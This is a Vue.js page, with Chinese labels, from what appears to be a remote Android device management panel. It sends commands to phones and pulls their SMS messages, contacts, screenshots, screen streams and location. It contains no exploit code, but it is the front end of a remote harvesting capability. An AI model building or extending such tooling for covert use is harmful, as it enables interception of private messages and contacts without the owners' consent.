<template>
  <div class="device-detail">
    <el-page-header @back="$router.back()" :title="device?.name || '设备详情'">
      <template #content>
        <span>{{ device?.name }} <el-tag size="small" :type="device?.status===3?'danger':device?.status===1?'success':'info'">{{ statusText }}</el-tag></span>
      </template>
      <template #extra>
        <el-button-group>
          <el-button size="small" type="primary" @click="pushCmd('run_local')" :disabled="!online">启动</el-button>
          <el-button size="small" type="danger" @click="pushCmd('stop_local')" :disabled="!online">停止</el-button>
          <el-button size="small" @click="pushCmd('screenshot')" :disabled="!online">截图</el-button>
          <el-button size="small" @click="pushCmd('screen_stream_start')" :disabled="!online">推流</el-button>
        </el-button-group>
      </template>
    </el-page-header>

    <el-row :gutter="12" style="margin-top:12px">
      <el-col :span="4" v-for="s in statCards" :key="s.key">
        <div class="info-card"><div class="info-card-label">{{ s.label }}</div><div class="info-card-value">{{ s.value }}</div></div>
      </el-col>
    </el-row>

    <el-tabs v-model="tab" style="margin-top:12px">
      <el-tab-pane label="截图" name="screenshots">
        <div style="margin-bottom:8px"><el-button size="small" @click="pushCmd('screenshot');setTimeout(loadScreenshots,2500)">📷 刷新截图</el-button></div>
        <el-row :gutter="8">
          <el-col :span="8" v-for="s in screenshots" :key="s.filename" style="margin-bottom:8px">
            <el-image :src="s.url" fit="cover" style="width:100%;height:180px;cursor:pointer" :preview-src-list="[s.url]" />
          </el-col>
        </el-row>
        <el-empty v-if="!screenshots.length" description="暂无截图" />
      </el-tab-pane>

      <el-tab-pane label="短信" name="sms">
        <div style="margin-bottom:8px">
          <el-button size="small" @click="pushCmd('read_sms',{count:30});setTimeout(loadSms,2500)">📥 拉取短信</el-button>
          <el-button size="small" @click="loadSms">🔄 刷新</el-button>
          <el-popconfirm title="确定清空全部短信？" @confirm="clearAllSms" v-if="smsList.length>0">
            <template #reference><el-button size="small" type="danger" plain>🗑 清空</el-button></template>
          </el-popconfirm>
        </div>
        <el-table :data="smsList" size="small" max-height="400" v-if="smsList.length>0" @row-click="openSms" highlight-current-row>
          <el-table-column prop="sender" label="号码" width="120" />
          <el-table-column prop="body" label="内容" show-overflow-tooltip>
            <template #default="{row}">{{ row.body?.substring(0,70) }}{{ row.body?.length>70?'...':'' }}</template>
          </el-table-column>
          <el-table-column prop="created_at" label="时间" width="150" />
          <el-table-column label="操作" width="50">
            <template #default="{row}">
              <el-popconfirm title="删除这条短信？" @confirm="delSms(row.id)" @click.stop>
                <template #reference><el-button link type="danger" size="small" @click.stop>✕</el-button></template>
              </el-popconfirm>
            </template>
          </el-table-column>
        </el-table>
        <el-empty v-else description="暂无短信，点击拉取" />
      </el-tab-pane>

      <el-tab-pane label="通讯录" name="contacts">
        <div style="margin-bottom:8px">
          <el-button size="small" @click="pushCmd('read_contacts');setTimeout(loadContacts,3000)">📥 拉取通讯录</el-button>
          <el-button size="small" @click="loadContacts">🔄 刷新</el-button>
          <el-popconfirm title="确定清空全部通讯录？" @confirm="clearAllContacts" v-if="contacts.length>0">
            <template #reference><el-button size="small" type="danger" plain>🗑 清空</el-button></template>
          </el-popconfirm>
        </div>
        <el-table :data="contacts" size="small" max-height="400" v-if="contacts.length>0">
          <el-table-column prop="name" label="姓名" width="110" />
          <el-table-column prop="phone" label="电话" width="150" />
          <el-table-column label="操作" width="50">
            <template #default="{row}">
              <el-popconfirm title="删除这条？" @confirm="delContact(row.id)">
                <template #reference><el-button link type="danger" size="small">✕</el-button></template>
              </el-popconfirm>
            </template>
          </el-table-column>
        </el-table>
        <el-empty v-else description="暂无通讯录，点击拉取" />
      </el-tab-pane>
    </el-tabs>

    <el-dialog v-model="showSmsDialog" title="短信详情" width="400px" @close="showSms=null">
      <div><b>号码：</b>{{ showSms?.sender }}</div>
      <div style="margin-top:10px"><b>时间：</b>{{ showSms?.created_at }}</div>
      <div style="margin-top:10px;white-space:pre-wrap;max-height:300px;overflow-y:auto;background:#f5f7fa;padding:12px;border-radius:8px">{{ showSms?.body }}</div>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue'
import { useRoute } from 'vue-router'
import http from '@/api/index'

const route = useRoute()
const deviceId = route.params.id || route.query.device_id
const device = ref({})
const screenshots = ref([])
const smsList = ref([])
const contacts = ref([])
const tab = ref('screenshots')
const showSms = ref(null)
const showSmsDialog = ref(false)
function openSms(row) { showSms.value = row; showSmsDialog.value = true }
let autoTimer = null

const online = computed(() => device.value?.status > 0)
const statusText = computed(() => ({0:'离线',1:'在线',2:'忙碌',3:'执行中'})[device.value?.status]||'未知')
const statCards = computed(() => {
  const d = device.value || {}
  return [
    { key:'model',label:'型号',value:d.model||'-' },
    { key:'os',label:'系统',value:'Android '+(d.os_version||'') },
    { key:'ip',label:'IP',value:d.ip||'-' },
    { key:'battery',label:'电量',value:d.battery?d.battery+'%':'-' },
    { key:'province',label:'位置',value:(d.province||'')+(d.city||'')||'-' },
    { key:'group',label:'分组',value:d.group?.name||'-' },
  ]
})

async function pushCmd(cmd, params) {
  try { await http.post('/ws/push-command', { device_id: device.value.device_id, command: cmd, params }) } catch(e){}
}
async function loadDevice() {
  try { const r = await http.get('/devices',{params:{keyword:deviceId,page:1,size:1}}); device.value=(r.data&&r.data[0])||{}; } catch(e){}
}
async function loadScreenshots() {
  try { const r = await http.get('/ws/screenshots',{params:{device_id:deviceId}}); const token=encodeURIComponent(localStorage.getItem('token')||''); screenshots.value=(r.data||[]).map(item=>({...item,url:item.url+'&access_token='+token})).slice(0,9); } catch(e){}
}
async function loadSms() {
  try { const r = await http.get('/devices/'+deviceId+'/sms'); smsList.value=r.data||[]; } catch(e){}
}
async function loadContacts() {
  try { const r = await http.get('/devices/'+deviceId+'/contacts'); contacts.value=r.data||[]; } catch(e){}
}
async function delSms(id) { try { await http.delete('/devices/'+deviceId+'/sms/'+id); loadSms(); } catch(e){} }
async function clearAllSms() { try { await http.delete('/devices/'+deviceId+'/sms'); loadSms(); } catch(e){} }
async function delContact(id) { try { await http.delete('/devices/'+deviceId+'/contacts/'+id); loadContacts(); } catch(e){} }
async function clearAllContacts() { try { await http.delete('/devices/'+deviceId+'/contacts'); loadContacts(); } catch(e){} }

onMounted(()=>{
  loadDevice(); loadScreenshots(); loadSms(); loadContacts()
  autoTimer = setInterval(loadSms, 30000)
})
onUnmounted(()=>{ clearInterval(autoTimer) })
</script>

<style scoped>
.device-detail { padding: 12px; }
.info-card { padding: 10px; background: #f5f7fa; border-radius: 8px; text-align: center; }
.info-card-label { font-size: 11px; color: #909399; }
.info-card-value { font-size: 14px; font-weight: 600; margin-top: 2px; }
</style>
